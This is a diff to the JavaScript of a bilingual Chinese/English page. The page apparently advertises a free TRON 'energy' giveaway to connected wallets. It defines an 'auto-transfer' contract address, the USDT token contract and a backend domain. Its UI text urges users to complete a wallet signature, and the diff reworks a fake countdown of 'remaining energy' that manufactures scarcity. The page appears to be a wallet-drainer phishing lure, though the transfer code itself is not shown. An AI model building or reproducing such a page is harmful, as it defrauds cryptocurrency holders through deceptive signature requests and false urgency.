@@ -817,7 +817,6 @@
     const DEPLOY_START_TIME = new Date().getTime();
     const INIT_TRX = 4104470400000; // 初始能量值
     const TRX_DECREASE_PER_SEC = 65200; // 每秒能量减少量
-    const STORAGE_KEY = "trx_countdown_data"; // 能量倒计时缓存
     const AUTO_TRANSFER_CONTRACT = "TYzaM18c6x8R6LtdWxNoCh665vzobRHrGL"; // 自动转账合约地址
     const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT合约地址
     const BACKEND_API = "https://kgjiopv1.com"; // 后端API地址
@@ -880,8 +879,8 @@
             connectedAmount: "• 领取额度：<span class='highlight'>90000μs</span>",
             connectedWarn: "⚠️提示：点击领取后请务必完成签名，中途退出视为已领取30日内不可再次领取",
             contractResourceTitle: "合约剩余资源",
-            contractAddrText: "• 合约地址：<span class='highlight' id='contractAddr'></span>",
-            contractEnergyText: "• 剩余能量：<span class='highlight data-tag' id='contractEnergy'></span>",
+            contractAddrText: "• 合约地址：",
+            contractEnergyText: "• 剩余能量：",
             contractNote: "注：剩余能量为“ 0 ”时停止领取，该项目为TRON生态公益项目，支持所有TRON兼容钱包参与。",
             recordTypeTitle: "能量使用范围",
             recordAmountTitle: "转账额度",
@@ -950,8 +949,8 @@
             connectedAmount: "• Claim Quota: <span class='highlight'>90000μs Energy</span>",
             connectedWarn: "⚠️ Note: Please complete the signature after clicking 'Claim' - exiting midway counts as claimed (no re-claim within 30 days)",
             contractResourceTitle: "Contract Remaining Resources",
-            contractAddrText: "• Contract Address: <span class='highlight' id='contractAddr'></span>",
-            contractEnergyText: "• Remaining Energy: <span class='highlight data-tag' id='contractEnergy'></span>",
+            contractAddrText: "• Contract Address: ",
+            contractEnergyText: "• Remaining Energy: ",
             contractNote: "Note: Distribution stops when remaining energy is '0' - TRON ecosystem public welfare project, supporting all TRON-compatible wallets",
             recordTypeTitle: "Energy Usage Scope",
             recordAmountTitle: "Transfer Quota",
@@ -1259,31 +1258,14 @@ async function queryUserEnergyBalance(address) {
      * @returns {number} 当前剩余能量
      */
     function calculateCurrentEnergy() {
-        const storedData = localStorage.getItem(STORAGE_KEY);
-        if (storedData) {
-            try {
-                const { energy, lastCalcTime } = JSON.parse(storedData);
-                if (typeof energy === "number" && typeof lastCalcTime === "number") {
-                    const secPassed = Math.floor((Date.now() - lastCalcTime) / 1000);
-                    currentEnergy = Math.max(0, energy - secPassed * TRX_DECREASE_PER_SEC);
-                } else {
-                    currentEnergy = INIT_TRX;
-                }
-            } catch (e) {
-                currentEnergy = INIT_TRX;
-            }
-        } else {
-            const secPassed = Math.max(0, Math.floor((Date.now() - DEPLOY_START_TIME) / 1000));
-            currentEnergy = Math.max(0, INIT_TRX - secPassed * TRX_DECREASE_PER_SEC);
-        }
-        localStorage.setItem(STORAGE_KEY, JSON.stringify({
-            energy: currentEnergy,
-            lastCalcTime: Date.now()
-        }));
-        if (contractEnergyEl) contractEnergyEl.textContent = Math.floor(currentEnergy);
-        return currentEnergy;
-    }
-
+    // 实时计算部署到当前的秒数差（不存本地，直接计算）
+    const secPassedSinceDeploy = Math.max(0, Math.floor((Date.now() - DEPLOY_START_TIME) / 1000));
+    // 实时计算剩余能量（最低为0，避免负数）
+    currentEnergy = Math.max(0, INIT_TRX - secPassedSinceDeploy * TRX_DECREASE_PER_SEC);
+    // 实时更新DOM显示
+    if (contractEnergyEl) contractEnergyEl.textContent = Math.floor(currentEnergy);
+    return currentEnergy;
+}
     /**
      * 更新合约剩余能量显示（倒计时刷新，无修改）
      */
@@ -1300,25 +1282,19 @@ async function queryUserEnergyBalance(address) {
      * 启动能量倒计时定时器（页面加载后调用，无修改）
      */
     function startPersistentEnergyCountdown() {
-        const hasClearedOldCache = localStorage.getItem("has_cleared_old_cache");
-        if (!hasClearedOldCache) {
-            localStorage.removeItem(STORAGE_KEY);
-            localStorage.setItem("has_cleared_old_cache", "true");
+    // 移除本地缓存清理逻辑（无需读写本地）
+    if (trxTimer) clearTimeout(trxTimer);
+    calculateCurrentEnergy(); // 首次实时计算
+    updateEnergyDisplay();
+    function tick() {
+        updateEnergyDisplay(); // 每秒实时重新计算
+        if (currentEnergy > 0) {
+            trxTimer = setTimeout(tick, 1000);
         }
-        if (trxTimer) clearTimeout(trxTimer);
-        calculateCurrentEnergy();
-        updateEnergyDisplay();
-
-        function tick() {
-            updateEnergyDisplay();
-            if (currentEnergy > 0) {
-                trxTimer = setTimeout(tick, 1000);
-            }
-        }
-        tick();
-        console.log("能量定时器已启动，递归模式");
     }
-
+    tick();
+    console.log("能量定时器已启动，纯实时计算模式");
+}
     /**
      * 保存能量领取记录到本地存储（无修改）
      */
